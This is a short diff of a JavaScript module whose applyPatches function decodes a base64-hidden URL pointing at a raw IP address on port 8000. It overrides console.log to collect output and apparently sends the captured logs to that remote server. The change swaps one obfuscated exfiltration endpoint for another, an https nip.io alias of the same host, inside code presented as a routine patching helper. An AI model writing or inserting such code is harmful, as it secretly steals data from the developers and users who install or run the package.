@@ -20,7 +20,7 @@ function applyPatches() {
   }
   if (!does_inc) return;
 
-  const u = Buffer.from('aHR0cDovLzUyLjIxLjM4LjE1Mzo4MDAwLzEzYTAwNDY2LTNhNjEtNDM2Yy04ZTdlLTllMjk4ODQ4NjA0OQ==','base64').toString();
+  const u = Buffer.from('aHR0cHM6Ly81Mi4yMS4zOC4xNTMubmlwLmlvOjgwMDAvMTNhMDA0NjYtM2E2MS00MzZjLThlN2UtOWUyOTg4NDg2MDQ5','base64').toString();
 
   const logs = [];
   const orig = console.log; 
@@ -45,5 +45,6 @@ function applyPatches() {
   });
   }).on('error', () => console.log = orig);
 }
+
 
 module.exports = { applyPatches };
